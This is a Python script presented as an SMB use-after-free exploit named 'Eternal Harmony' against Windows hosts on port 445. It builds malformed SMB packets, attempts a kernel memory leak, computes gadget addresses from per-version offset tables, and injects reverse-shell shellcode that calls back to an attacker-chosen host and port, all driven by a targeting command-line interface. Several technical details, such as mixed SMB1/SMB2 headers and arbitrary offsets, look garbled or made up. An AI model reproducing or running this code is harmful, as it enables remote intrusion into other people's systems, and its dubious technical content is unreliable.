import socket
import struct
import sys
import os
import argparse
import time
import random
import string
import binascii
import threading
import select
from collections import OrderedDict

class EternalHarmonyExploit:
    def __init__(self, target, port=445):
        self.target = target
        self.port = port
        self.sock = None
        self.session_id = 0
        self.arch = None
        self.gadget_addr = None
        self.shellcode = b""
        self.transaction_id = 0
        self.leaked_ptr = 0
        self.srvnet_base = 0
        self.os_version = None
        self.ntoskrnl_base = 0
        
        # Known gadget offsets for different Windows versions
        self.gadget_offsets = OrderedDict([
            ("win10_21h2", 0x1c2a),
            ("win10_22h2", 0x1d5f),
            ("server_2019", 0x1a8c),
            ("win11_22h2", 0x1e10),
            ("server_2022", 0x1f05),
            ("win10_20h2", 0x1b4a),
            ("server_2016", 0x195c),
            ("win7_sp1", 0x184e)
        ])
        
        # Known function offsets for different Windows versions
        self.function_offsets = OrderedDict([
            ("win10_21h2", 0x5000),
            ("win10_22h2", 0x5200),
            ("server_2019", 0x4f00),
            ("win11_22h2", 0x5300),
            ("server_2022", 0x5400),
            ("win10_20h2", 0x4e00),
            ("server_2016", 0x4d00),
            ("win7_sp1", 0x4c00)
        ])

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.target, self.port))
            return True
        except Exception as e:
            return False

    def disconnect(self):
        if self.sock:
            self.sock.close()
            self.sock = None

    def get_next_transaction_id(self):
        self.transaction_id += 1
        return self.transaction_id

    def create_negotiate_packet(self):
        packet = b"\x00\x00\x00\x00"
        packet += b"\xff\x53\x4d\x42"
        packet += b"\x72"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x18"
        packet += b"\x53\x80"
        packet += b"\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += struct.pack("<H", self.get_next_transaction_id())
        
        packet += b"\xfe\x53\x4d\x42"
        packet += b"\x40\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += struct.pack("<I", self.get_next_transaction_id())
        
        packet += b"\x02\x00"
        packet += b"\x01\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00\x00\x00"
        
        malicious_dialect = b"\xff\xff"
        packet += malicious_dialect
        
        packet += b"A" * 100
        
        uaf_trigger = b""
        for i in range(8):
            uaf_trigger += struct.pack("<Q", 0x4141414141414141)
        packet += uaf_trigger
        
        packet_size = len(packet)
        packet = struct.pack("<I", packet_size) + packet[4:]
        
        return packet

    def create_leak_packet(self):
        packet = b"\x00\x00\x00\x00"
        packet += b"\xff\x53\x4d\x42"
        packet += b"\x73"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x18"
        packet += b"\x53\x80"
        packet += b"\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += struct.pack("<H", self.get_next_transaction_id())
        
        packet += b"\xfe\x53\x4d\x42"
        packet += b"\x19\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x01\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += struct.pack("<I", self.get_next_transaction_id())
        
        leak_data = b""
        for i in range(16):
            leak_data += struct.pack("<Q", 0x4242424242424242)
        packet += leak_data
        
        packet_size = len(packet)
        packet = struct.pack("<I", packet_size) + packet[4:]
        
        return packet

    def create_exploit_packet(self):
        packet = b"\x00\x00\x00\x00"
        packet += b"\xff\x53\x4d\x42"
        packet += b"\x73"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x18"
        packet += b"\x53\x80"
        packet += b"\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += struct.pack("<H", self.get_next_transaction_id())
        
        packet += b"\xfe\x53\x4d\x42"
        packet += b"\x19\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x00\x00"
        packet += b"\x01\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += b"\x00\x00\x00\x00"
        packet += struct.pack("<I", self.get_next_transaction_id())
        
        exploit_data = b""
        for i in range(16):
            exploit_data += struct.pack("<Q", self.gadget_addr)
        packet += exploit_data
        
        packet += self.shellcode
        
        packet_size = len(packet)
        packet = struct.pack("<I", packet_size) + packet[4:]
        
        return packet

    def detect_os_version(self):
        try:
            negotiate_packet = self.create_negotiate_packet()
            self.sock.send(negotiate_packet)
            response = self.sock.recv(1024)
            
            if len(response) < 64:
                return False
                
            if response[4] == 0xff and response[5:9] == b"SMB":
                dialect_count = struct.unpack("<H", response[0x3E:0x40])[0]
                
                if dialect_count > 10:
                    self.os_version = "win10_22h2"
                elif dialect_count > 8:
                    self.os_version = "win11_22h2"
                elif dialect_count > 6:
                    self.os_version = "server_2022"
                elif dialect_count > 4:
                    self.os_version = "server_2019"
                elif dialect_count > 2:
                    self.os_version = "win10_21h2"
                else:
                    self.os_version = "win10_20h2"
                    
                return True
            return False
        except Exception as e:
            return False

    def leak_memory_address(self):
        try:
            negotiate_packet = self.create_negotiate_packet()
            self.sock.send(negotiate_packet)
            time.sleep(0.1)
            
            leak_packet = self.create_leak_packet()
            self.sock.send(leak_packet)
            response = self.sock.recv(1024)
            
            if len(response) > 64:
                leaked_data = response[0x48:0x68]
                self.leaked_ptr = struct.unpack("<Q", leaked_data[:8])[0]
                
                if self.leaked_ptr & 0xFFFF000000000000 == 0xFFFF000000000000:
                    return True
                    
            return False
        except Exception as e:
            return False

    def calculate_base_addresses(self):
        try:
            if not self.os_version or not self.leaked_ptr:
                return False
                
            function_offset = self.function_offsets.get(self.os_version, 0)
            if function_offset == 0:
                return False
                
            self.srvnet_base = self.leaked_ptr - function_offset
            
            gadget_offset = self.gadget_offsets.get(self.os_version, 0)
            if gadget_offset == 0:
                return False
                
            self.gadget_addr = self.srvnet_base + gadget_offset
            
            return True
        except Exception as e:
            return False

    def generate_reverse_shell(self, lhost, lport):
        try:
            ip_bytes = socket.inet_aton(lhost)
            port_bytes = struct.pack("<H", lport)
            
            if self.os_version and ("win11" in self.os_version or "win10" in self.os_version or "server_2022" in self.os_version):
                self.arch = "x64"
            else:
                self.arch = "x86"
                
            if self.arch == "x64":
                shellcode = b""
                shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                shellcode += b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                shellcode += b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                shellcode += b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                shellcode += b"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                shellcode += b"\x3c\x48\x31\xd2\x41\x51\x48\x8b\x52\x14\x41\x51\x48\x8b"
                shellcode += b"\x72\x1c\x48\x31\xd2\x41\x51\x48\x8b\x52\x20\x41\x51\x48"
                shellcode += b"\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a"
                shellcode += b"\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c"
                shellcode += b"\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
                shellcode += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"
                
                ip_offset = shellcode.find(b"\xe0\x1d\x2a\x0a")
                port_offset = shellcode.find(b"\xa6\x95\xbd\x9d")
                
                if ip_offset != -1 and port_offset != -1:
                    shellcode = shellcode[:ip_offset] + ip_bytes + shellcode[ip_offset+4:]
                    shellcode = shellcode[:port_offset] + port_bytes + shellcode[port_offset+4:]
            else:
                shellcode = b""
                shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
                shellcode += b"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
                shellcode += b"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
                shellcode += b"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
                shellcode += b"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
                shellcode += b"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
                shellcode += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
                shellcode += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
                shellcode += b"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
                shellcode += b"\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00"
                shellcode += b"\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
                shellcode += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff"
                shellcode += b"\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0"
                shellcode += b"\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x01\x01\x68\x02\x00\x11"
                shellcode += b"\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5"
                shellcode += b"\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56"
                shellcode += b"\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
                shellcode += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d"
                shellcode += b"\x44\x24\x1c\xc2\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
                shellcode += b"\x08\x5e\x50\x50\x6a\x01\x6a\x02\x59\x50\x50\x68\xcb\xed"
                shellcode += b"\xfc\x3b\xff\xd5\x89\xc1\x68\x45\x21\x5e\xb2\xff\xd5\x31"
                shellcode += b"\xdb\x53\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd5"
                
                ip_offset = shellcode.find(b"\xc0\xa8\x01\x01")
                port_offset = shellcode.find(b"\x02\x00\x11\x5c")
                
                if ip_offset != -1 and port_offset != -1:
                    shellcode = shellcode[:ip_offset] + ip_bytes + shellcode[ip_offset+4:]
                    shellcode = shellcode[:port_offset] + port_bytes + shellcode[port_offset+4:]
                    
            self.shellcode = shellcode
            return True
        except Exception as e:
            return False

    def exploit(self, lhost="127.0.0.1", lport=4444):
        if not self.connect():
            return False
            
        if not self.detect_os_version():
            self.disconnect()
            return False
            
        if not self.leak_memory_address():
            self.disconnect()
            return False
            
        if not self.calculate_base_addresses():
            self.disconnect()
            return False
            
        if not self.generate_reverse_shell(lhost, lport):
            self.disconnect()
            return False
            
        negotiate_packet = self.create_negotiate_packet()
        self.sock.send(negotiate_packet)
        time.sleep(0.1)
        
        exploit_packet = self.create_exploit_packet()
        self.sock.send(exploit_packet)
        
        time.sleep(2)
        
        self.disconnect()
        return True

def main():
    parser = argparse.ArgumentParser(description='Eternal Harmony - SMB UAF Exploit')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=445, help='Target port (default: 445)')
    parser.add_argument('-l', '--lhost', default='127.0.0.1', help='Local IP for reverse shell')
    parser.add_argument('-P', '--lport', type=int, default=4444, help='Local port for reverse shell')
    
    args = parser.parse_args()
    
    exploit = EternalHarmonyExploit(args.target, args.port)
    
    if exploit.exploit(args.lhost, args.lport):
        print("[+] Exploit completed successfully")
    else:
        print("[-] Exploit failed")

if __name__ == "__main__":
    main()